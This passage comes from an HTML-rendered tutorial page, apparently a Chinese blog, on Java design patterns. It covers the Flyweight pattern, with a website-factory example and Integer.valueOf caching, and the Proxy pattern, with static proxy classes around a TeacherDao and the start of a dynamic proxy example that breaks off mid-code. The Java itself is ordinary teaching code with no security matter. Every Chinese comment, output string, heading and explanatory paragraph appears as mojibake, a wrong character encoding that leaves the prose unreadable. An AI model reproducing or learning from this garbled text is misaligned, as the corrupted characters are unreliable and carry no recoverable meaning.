stub</span><br><br>      <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªå·¥å‚ç±»</span><br>      <span class="hljs-type">WebSiteFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSiteFactory</span>();<br><br>      <span class="hljs-comment">// å®¢æˆ·è¦ä¸€ä¸ªä»¥æ–°é—»å½¢å¼å‘å¸ƒçš„ç½‘ç«™</span><br>      <span class="hljs-type">WebSite</span> <span class="hljs-variable">webSite1</span> <span class="hljs-operator">=</span> factory.getWebSiteCategory(<span class="hljs-string">&quot;æ–°é—»&quot;</span>);<br><br>      <br>      webSite1.use(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;tom&quot;</span>));<br><br>      <span class="hljs-comment">// å®¢æˆ·è¦ä¸€ä¸ªä»¥åšå®¢å½¢å¼å‘å¸ƒçš„ç½‘ç«™</span><br>      <span class="hljs-type">WebSite</span> <span class="hljs-variable">webSite2</span> <span class="hljs-operator">=</span> factory.getWebSiteCategory(<span class="hljs-string">&quot;åšå®¢&quot;</span>);<br><br>      webSite2.use(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;jack&quot;</span>));<br><br>      <span class="hljs-comment">// å®¢æˆ·è¦ä¸€ä¸ªä»¥åšå®¢å½¢å¼å‘å¸ƒçš„ç½‘ç«™</span><br>      <span class="hljs-type">WebSite</span> <span class="hljs-variable">webSite3</span> <span class="hljs-operator">=</span> factory.getWebSiteCategory(<span class="hljs-string">&quot;åšå®¢&quot;</span>);<br><br>      webSite3.use(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;smith&quot;</span>));<br><br>      <span class="hljs-comment">// å®¢æˆ·è¦ä¸€ä¸ªä»¥åšå®¢å½¢å¼å‘å¸ƒçš„ç½‘ç«™</span><br>      <span class="hljs-type">WebSite</span> <span class="hljs-variable">webSite4</span> <span class="hljs-operator">=</span> factory.getWebSiteCategory(<span class="hljs-string">&quot;åšå®¢&quot;</span>);<br><br>      webSite4.use(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;king&quot;</span>));<br>      <br>      System.out.println(<span class="hljs-string">&quot;ç½‘ç«™çš„åˆ†ç±»å…±=&quot;</span> + factory.getWebSiteCount());<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">æ¬¢è¿ä½¿ç”¨xtwoyç³»ç»Ÿ<br>ç½‘ç«™çš„å‘å¸ƒå½¢å¼ä¸º:æ–°é—» åœ¨ä½¿ç”¨ä¸­ <span class="hljs-string">..</span> ä½¿ç”¨è€…æ˜¯tom<br>æ¬¢è¿ä½¿ç”¨xtwoyç³»ç»Ÿ<br>ç½‘ç«™çš„å‘å¸ƒå½¢å¼ä¸º:åšå®¢ åœ¨ä½¿ç”¨ä¸­ <span class="hljs-string">..</span> ä½¿ç”¨è€…æ˜¯jack<br>æ¬¢è¿ä½¿ç”¨xtwoyç³»ç»Ÿ<br>ç½‘ç«™çš„å‘å¸ƒå½¢å¼ä¸º:åšå®¢ åœ¨ä½¿ç”¨ä¸­ <span class="hljs-string">..</span> ä½¿ç”¨è€…æ˜¯smith<br>æ¬¢è¿ä½¿ç”¨xtwoyç³»ç»Ÿ<br>ç½‘ç«™çš„å‘å¸ƒå½¢å¼ä¸º:åšå®¢ åœ¨ä½¿ç”¨ä¸­ <span class="hljs-string">..</span> ä½¿ç”¨è€…æ˜¯king<br>ç½‘ç«™çš„åˆ†ç±»å…±=2<br></code></pre></td></tr></table></figure><h2 id="äº«å…ƒæ¨¡å¼åœ¨-jdk-interger-çš„åº”ç”¨æºç åˆ†æ"><a class="markdownIt-Anchor" href="#äº«å…ƒæ¨¡å¼åœ¨-jdk-interger-çš„åº”ç”¨æºç åˆ†æ"></a> äº«å…ƒæ¨¡å¼åœ¨ JDK-Interger çš„åº”ç”¨æºç åˆ†æ</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.atguigu.jdk;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FlyWeight</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//å¦‚æœ Integer.valueOf(x) x åœ¨  -128 --- 127 ç›´æ¥ï¼Œå°±æ˜¯ä½¿ç”¨äº«å…ƒæ¨¡å¼è¿”å›,å¦‚æœä¸åœ¨</span><br>      <span class="hljs-comment">//èŒƒå›´ç±»ï¼Œåˆ™ä»ç„¶ new </span><br>      <br>      <span class="hljs-comment">//å°ç»“:</span><br>      <span class="hljs-comment">//1. åœ¨valueOf æ–¹æ³•ä¸­ï¼Œå…ˆåˆ¤æ–­å€¼æ˜¯å¦åœ¨ IntegerCache ä¸­ï¼Œå¦‚æœä¸åœ¨ï¼Œå°±åˆ›å»ºæ–°çš„Integer(new), å¦åˆ™ï¼Œå°±ç›´æ¥ä» ç¼“å­˜æ± è¿”å›</span><br>      <span class="hljs-comment">//2. valueOf æ–¹æ³•ï¼Œå°±ä½¿ç”¨åˆ°äº«å…ƒæ¨¡å¼</span><br>      <span class="hljs-comment">//3. å¦‚æœä½¿ç”¨valueOf æ–¹æ³•å¾—åˆ°ä¸€ä¸ªInteger å®ä¾‹ï¼ŒèŒƒå›´åœ¨ -128 - 127 ï¼Œæ‰§è¡Œé€Ÿåº¦æ¯” new å¿«</span><br>      <br>      <br>      <span class="hljs-type">Integer</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> Integer.valueOf(<span class="hljs-number">127</span>); <span class="hljs-comment">// å¾—åˆ° xå®ä¾‹ï¼Œç±»å‹ Integer</span><br>      <span class="hljs-type">Integer</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">127</span>); <span class="hljs-comment">// å¾—åˆ° y å®ä¾‹ï¼Œç±»å‹ Integer</span><br>      <span class="hljs-type">Integer</span> <span class="hljs-variable">z</span> <span class="hljs-operator">=</span> Integer.valueOf(<span class="hljs-number">127</span>);<span class="hljs-comment">//..</span><br>      <span class="hljs-type">Integer</span> <span class="hljs-variable">w</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">127</span>);<br>      <br>      <br>      System.out.println(x.equals(y)); <span class="hljs-comment">// å¤§å°ï¼Œtrue</span><br>      System.out.println(x == y ); <span class="hljs-comment">//  false</span><br>      System.out.println(x == z ); <span class="hljs-comment">// true</span><br>      System.out.println(w == x ); <span class="hljs-comment">// false</span><br>      System.out.println(w == y ); <span class="hljs-comment">// false</span><br>      <br>      <br>      <span class="hljs-type">Integer</span> <span class="hljs-variable">x1</span> <span class="hljs-operator">=</span> Integer.valueOf(<span class="hljs-number">200</span>);<br>      <span class="hljs-type">Integer</span> <span class="hljs-variable">x2</span> <span class="hljs-operator">=</span> Integer.valueOf(<span class="hljs-number">200</span>);<br>      System.out.println(<span class="hljs-string">&quot;x1==x2&quot;</span> + (x1 == x2)); <span class="hljs-comment">// false</span><br><br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103111534525.png" alt="image-20230103111534525" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103111520047.png" alt="image-20230103111516626" /></p><h2 id="äº«å…ƒæ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#äº«å…ƒæ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> äº«å…ƒæ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h2><ol><li><p>åœ¨äº«å…ƒæ¨¡å¼è¿™æ ·ç†è§£ï¼Œâ€œäº«â€å°±è¡¨ç¤ºå…±äº«ï¼Œâ€œå…ƒâ€è¡¨ç¤ºå¯¹è±¡</p></li><li><p>ç³»ç»Ÿä¸­æœ‰å¤§é‡å¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡æ¶ˆè€—å¤§é‡å†…å­˜ï¼Œå¹¶ä¸”å¯¹è±¡çš„çŠ¶æ€å¤§éƒ¨åˆ†å¯ä»¥å¤–éƒ¨åŒ–æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘é€‰ç”¨äº«å…ƒæ¨¡å¼</p></li><li><p>ç”¨å”¯ä¸€æ ‡è¯†ç åˆ¤æ–­ï¼Œå¦‚æœåœ¨å†…å­˜ä¸­æœ‰ï¼Œåˆ™è¿”å›è¿™ä¸ªå”¯ä¸€æ ‡è¯†ç æ‰€æ ‡è¯†çš„å¯¹è±¡ï¼Œç”¨ HashMap/HashTable å­˜å‚¨</p></li><li><p>äº«å…ƒæ¨¡å¼å¤§å¤§å‡å°‘äº†å¯¹è±¡çš„åˆ›å»ºï¼Œé™ä½äº†ç¨‹åºå†…å­˜çš„å ç”¨ï¼Œæé«˜æ•ˆç‡</p></li><li><p>äº«å…ƒæ¨¡å¼æé«˜äº†<strong>ç³»ç»Ÿçš„å¤æ‚åº¦</strong>ã€‚éœ€è¦åˆ†ç¦»å‡º<strong>å†…éƒ¨çŠ¶æ€å’Œå¤–éƒ¨çŠ¶æ€</strong>ï¼Œè€Œå¤–éƒ¨çŠ¶æ€å…·æœ‰å›ºåŒ–ç‰¹æ€§ï¼Œä¸åº”è¯¥éšç€å†…éƒ¨çŠ¶æ€çš„æ”¹å˜è€Œæ”¹å˜ï¼Œè¿™æ˜¯æˆ‘ä»¬ä½¿ç”¨äº«å…ƒæ¨¡å¼éœ€è¦æ³¨æ„çš„åœ°æ–¹.</p></li><li><p>ä½¿ç”¨äº«å…ƒæ¨¡å¼æ—¶ï¼Œæ³¨æ„åˆ’åˆ†å†…éƒ¨çŠ¶æ€å’Œå¤–éƒ¨çŠ¶æ€ï¼Œå¹¶ä¸”éœ€è¦æœ‰ä¸€ä¸ªå·¥å‚ç±»åŠ ä»¥æ§åˆ¶ã€‚</p></li><li><p>äº«å…ƒæ¨¡å¼ç»å…¸çš„åº”ç”¨åœºæ™¯æ˜¯éœ€è¦ç¼“å†²æ± çš„åœºæ™¯ï¼Œæ¯”å¦‚ String å¸¸é‡æ± ã€æ•°æ®åº“è¿æ¥æ± </p></li></ol><h1 id="ä»£ç†æ¨¡å¼"><a class="markdownIt-Anchor" href="#ä»£ç†æ¨¡å¼"></a> <mark>ä»£ç†æ¨¡å¼</mark></h1><p>åœ¨ä»£ç†æ¨¡å¼ï¼ˆProxy Patternï¼‰ä¸­ï¼Œä¸€ä¸ªç±»ä»£è¡¨å¦ä¸€ä¸ªç±»çš„åŠŸèƒ½ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºç»“æ„å‹æ¨¡å¼ã€‚</p><p>åœ¨ä»£ç†æ¨¡å¼ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºå…·æœ‰ç°æœ‰å¯¹è±¡çš„å¯¹è±¡ï¼Œä»¥ä¾¿å‘å¤–ç•Œæä¾›åŠŸèƒ½æ¥å£ã€‚</p><h2 id="ä»‹ç»-11"><a class="markdownIt-Anchor" href="#ä»‹ç»-11"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> ä¸ºå…¶ä»–å¯¹è±¡æä¾›ä¸€ç§ä»£ç†ä»¥æ§åˆ¶å¯¹è¿™ä¸ªå¯¹è±¡çš„è®¿é—®ã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong><br />åœ¨ç›´æ¥è®¿é—®å¯¹è±¡æ—¶å¸¦æ¥çš„é—®é¢˜ï¼Œæ¯”å¦‚è¯´ï¼šè¦è®¿é—®çš„å¯¹è±¡åœ¨è¿œç¨‹çš„æœºå™¨ä¸Šã€‚åœ¨é¢å‘å¯¹è±¡ç³»ç»Ÿä¸­ï¼Œæœ‰äº›å¯¹è±¡ç”±äºæŸäº›åŸå› ï¼ˆæ¯”å¦‚å¯¹è±¡åˆ›å»ºå¼€é”€å¾ˆå¤§ï¼Œæˆ–è€…æŸäº›æ“ä½œéœ€è¦å®‰å…¨æ§åˆ¶ï¼Œæˆ–è€…éœ€è¦è¿›ç¨‹å¤–çš„è®¿é—®ï¼‰ï¼Œç›´æ¥è®¿é—®ä¼šç»™ä½¿ç”¨è€…æˆ–è€…ç³»ç»Ÿç»“æ„å¸¦æ¥å¾ˆå¤šéº»çƒ¦ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è®¿é—®æ­¤å¯¹è±¡æ—¶åŠ ä¸Šä¸€ä¸ªå¯¹æ­¤å¯¹è±¡çš„è®¿é—®å±‚ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong> æƒ³åœ¨è®¿é—®ä¸€ä¸ªç±»æ—¶åšä¸€äº›æ§åˆ¶ã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> å¢åŠ ä¸­é—´å±‚ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> å®ç°ä¸è¢«ä»£ç†ç±»ç»„åˆã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> 1ã€Windows é‡Œé¢çš„å¿«æ·æ–¹å¼ã€‚2ã€çŒªå…«æˆ’å»æ‰¾é«˜ç¿ å…°ç»“æœæ˜¯å­™æ‚Ÿç©ºå˜çš„ï¼Œå¯ä»¥è¿™æ ·ç†è§£ï¼šæŠŠé«˜ç¿ å…°çš„å¤–è²ŒæŠ½è±¡å‡ºæ¥ï¼Œé«˜ç¿ å…°æœ¬äººå’Œå­™æ‚Ÿç©ºéƒ½å®ç°äº†è¿™ä¸ªæ¥å£ï¼ŒçŒªå…«æˆ’è®¿é—®é«˜ç¿ å…°çš„æ—¶å€™çœ‹ä¸å‡ºæ¥è¿™ä¸ªæ˜¯å­™æ‚Ÿç©ºï¼Œæ‰€ä»¥è¯´å­™æ‚Ÿç©ºæ˜¯é«˜ç¿ å…°ä»£ç†ç±»ã€‚3ã€ä¹°ç«è½¦ç¥¨ä¸ä¸€å®šåœ¨ç«è½¦ç«™ä¹°ï¼Œä¹Ÿå¯ä»¥å»ä»£å”®ç‚¹ã€‚ 4ã€ä¸€å¼ æ”¯ç¥¨æˆ–é“¶è¡Œå­˜å•æ˜¯è´¦æˆ·ä¸­èµ„é‡‘çš„ä»£ç†ã€‚æ”¯ç¥¨åœ¨å¸‚åœºäº¤æ˜“ä¸­ç”¨æ¥ä»£æ›¿ç°é‡‘ï¼Œå¹¶æä¾›å¯¹ç­¾å‘äººè´¦å·ä¸Šèµ„é‡‘çš„æ§åˆ¶ã€‚5ã€spring aopã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> 1ã€èŒè´£æ¸…æ™°ã€‚ 2ã€é«˜æ‰©å±•æ€§ã€‚ 3ã€æ™ºèƒ½åŒ–ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong> 1ã€ç”±äºåœ¨å®¢æˆ·ç«¯å’ŒçœŸå®ä¸»é¢˜ä¹‹é—´å¢åŠ äº†ä»£ç†å¯¹è±¡ï¼Œå› æ­¤æœ‰äº›ç±»å‹çš„ä»£ç†æ¨¡å¼å¯èƒ½ä¼šé€ æˆè¯·æ±‚çš„å¤„ç†é€Ÿåº¦å˜æ…¢ã€‚2ã€å®ç°ä»£ç†æ¨¡å¼éœ€è¦é¢å¤–çš„å·¥ä½œï¼Œæœ‰äº›ä»£ç†æ¨¡å¼çš„å®ç°éå¸¸å¤æ‚ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> æŒ‰èŒè´£æ¥åˆ’åˆ†ï¼Œé€šå¸¸æœ‰ä»¥ä¸‹ä½¿ç”¨åœºæ™¯ï¼š 1ã€è¿œç¨‹ä»£ç†ã€‚ 2ã€è™šæ‹Ÿä»£ç†ã€‚ 3ã€Copy-on-Write ä»£ç†ã€‚ 4ã€ä¿æŠ¤ï¼ˆProtector Accessï¼‰ä»£ç†ã€‚ 5ã€Cacheä»£ç†ã€‚ 6ã€é˜²ç«å¢™ï¼ˆFirewallï¼‰ä»£ç†ã€‚ 7ã€åŒæ­¥åŒ–ï¼ˆSynchronizationï¼‰ä»£ç†ã€‚8ã€æ™ºèƒ½å¼•ç”¨ï¼ˆSmart Referenceï¼‰ä»£ç†ã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> 1ã€å’Œé€‚é…å™¨æ¨¡å¼çš„åŒºåˆ«ï¼šé€‚é…å™¨æ¨¡å¼ä¸»è¦æ”¹å˜æ‰€è€ƒè™‘å¯¹è±¡çš„æ¥å£ï¼Œè€Œä»£ç†æ¨¡å¼ä¸èƒ½æ”¹å˜æ‰€ä»£ç†ç±»çš„æ¥å£ã€‚2ã€å’Œè£…é¥°å™¨æ¨¡å¼çš„åŒºåˆ«ï¼šè£…é¥°å™¨æ¨¡å¼ä¸ºäº†å¢å¼ºåŠŸèƒ½ï¼Œè€Œä»£ç†æ¨¡å¼æ˜¯ä¸ºäº†åŠ ä»¥æ§åˆ¶ã€‚</p><h2 id="å®ç°-9"><a class="markdownIt-Anchor" href="#å®ç°-9"></a> å®ç°</h2><h3 id="é™æ€ä»£ç†"><a class="markdownIt-Anchor" href="#é™æ€ä»£ç†"></a> é™æ€ä»£ç†</h3><blockquote><p>é™æ€ä»£ç æ¨¡å¼çš„åŸºæœ¬ä»‹ç»</p></blockquote><p>é™æ€ä»£ç†åœ¨ä½¿ç”¨æ—¶,éœ€è¦å®šä¹‰æ¥å£æˆ–è€…çˆ¶ç±»,è¢«ä»£ç†å¯¹è±¡(å³ç›®æ ‡å¯¹è±¡)ä¸ä»£ç†å¯¹è±¡ä¸€èµ·å®ç°ç›¸åŒçš„æ¥å£æˆ–è€…æ˜¯ç»§æ‰¿ç›¸åŒçˆ¶ç±»</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103144345369.png" alt="image-20230103144345369" /></p><p><code>ITeacherDao.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.staticproxy;<br><br><br><span class="hljs-comment">//æ¥å£</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ITeacherDao</span> &#123;<br>   <br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">teach</span><span class="hljs-params">()</span>; <span class="hljs-comment">// æˆè¯¾çš„æ–¹æ³•</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>TeacherDao.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.staticproxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TeacherDao</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ITeacherDao</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">teach</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; è€å¸ˆæˆè¯¾ä¸­  ã€‚ã€‚ã€‚ã€‚ã€‚&quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>TeacherDaoProxy.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.staticproxy;<br><br><span class="hljs-comment">//ä»£ç†å¯¹è±¡,é™æ€ä»£ç†</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TeacherDaoProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ITeacherDao</span>&#123;<br>   <br>   <span class="hljs-keyword">private</span> ITeacherDao target; <span class="hljs-comment">// ç›®æ ‡å¯¹è±¡ï¼Œé€šè¿‡æ¥å£æ¥èšåˆ</span><br>   <br>   <br>   <span class="hljs-comment">//æ„é€ å™¨</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">TeacherDaoProxy</span><span class="hljs-params">(ITeacherDao target)</span> &#123;<br>      <span class="hljs-built_in">this</span>.target = target;<br>   &#125;<br><br><br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">teach</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;å¼€å§‹ä»£ç†  å®ŒæˆæŸäº›æ“ä½œã€‚ã€‚ã€‚ã€‚ã€‚ &quot;</span>);<span class="hljs-comment">//æ–¹æ³•</span><br>      target.teach();<br>      System.out.println(<span class="hljs-string">&quot;æäº¤ã€‚ã€‚ã€‚ã€‚ã€‚&quot;</span>);<span class="hljs-comment">//æ–¹æ³•</span><br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.staticproxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//åˆ›å»ºç›®æ ‡å¯¹è±¡(è¢«ä»£ç†å¯¹è±¡)</span><br>      <span class="hljs-type">TeacherDao</span> <span class="hljs-variable">teacherDao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TeacherDao</span>();<br>      <br>      <span class="hljs-comment">//åˆ›å»ºä»£ç†å¯¹è±¡, åŒæ—¶å°†è¢«ä»£ç†å¯¹è±¡ä¼ é€’ç»™ä»£ç†å¯¹è±¡</span><br>      <span class="hljs-type">TeacherDaoProxy</span> <span class="hljs-variable">teacherDaoProxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TeacherDaoProxy</span>(teacherDao);<br>      <br>      <span class="hljs-comment">//é€šè¿‡ä»£ç†å¯¹è±¡ï¼Œè°ƒç”¨åˆ°è¢«ä»£ç†å¯¹è±¡çš„æ–¹æ³•</span><br>      <span class="hljs-comment">//å³ï¼šæ‰§è¡Œçš„æ˜¯ä»£ç†å¯¹è±¡çš„æ–¹æ³•ï¼Œä»£ç†å¯¹è±¡å†å»è°ƒç”¨ç›®æ ‡å¯¹è±¡çš„æ–¹æ³• </span><br>      teacherDaoProxy.teach();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">å¼€å§‹ä»£ç†  å®ŒæˆæŸäº›æ“ä½œã€‚ã€‚ã€‚ã€‚ã€‚ <br> è€å¸ˆæˆè¯¾ä¸­  ã€‚ã€‚ã€‚ã€‚ã€‚<br>æäº¤ã€‚ã€‚ã€‚ã€‚ã€‚<br><br></code></pre></td></tr></table></figure><blockquote><p>é™æ€ä»£ç†ä¼˜ç¼ºç‚¹</p></blockquote><ol><li><p>ä¼˜ç‚¹ï¼šåœ¨ä¸ä¿®æ”¹ç›®æ ‡å¯¹è±¡çš„åŠŸèƒ½å‰æä¸‹, èƒ½é€šè¿‡ä»£ç†å¯¹è±¡å¯¹ç›®æ ‡åŠŸèƒ½æ‰©å±•</p></li><li><p>ç¼ºç‚¹ï¼šå› ä¸ºä»£ç†å¯¹è±¡éœ€è¦ä¸ç›®æ ‡å¯¹è±¡å®ç°ä¸€æ ·çš„æ¥å£,æ‰€ä»¥ä¼šæœ‰å¾ˆå¤šä»£ç†ç±»</p></li><li><p>ä¸€æ—¦æ¥å£å¢åŠ æ–¹æ³•,ç›®æ ‡å¯¹è±¡ä¸ä»£ç†å¯¹è±¡éƒ½è¦ç»´æŠ¤</p></li></ol><h3 id="åŠ¨æ€ä»£ç†"><a class="markdownIt-Anchor" href="#åŠ¨æ€ä»£ç†"></a> åŠ¨æ€ä»£ç†</h3><blockquote><p>åŠ¨æ€ä»£ç†æ¨¡å¼çš„åŸºæœ¬ä»‹ç»</p></blockquote><ol><li>ä»£ç†å¯¹è±¡,ä¸éœ€è¦å®ç°æ¥å£ï¼Œä½†æ˜¯ç›®æ ‡å¯¹è±¡è¦å®ç°æ¥å£ï¼Œå¦åˆ™ä¸èƒ½ç”¨åŠ¨æ€ä»£ç†</li><li>ä»£ç†å¯¹è±¡çš„ç”Ÿæˆï¼Œæ˜¯åˆ©ç”¨ JDK çš„ APIï¼ŒåŠ¨æ€çš„åœ¨å†…å­˜ä¸­æ„å»ºä»£ç†å¯¹è±¡</li><li>åŠ¨æ€ä»£ç†ä¹Ÿå«åšï¼šJDK ä»£ç†ã€æ¥å£ä»£ç†</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103144507077.png" alt="image-20230103144507077" /></p><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.dynamic;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//åˆ›å»ºç›®æ ‡å¯¹è±¡</span><br>      <span class="hljs-type">ITeacherDao</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span 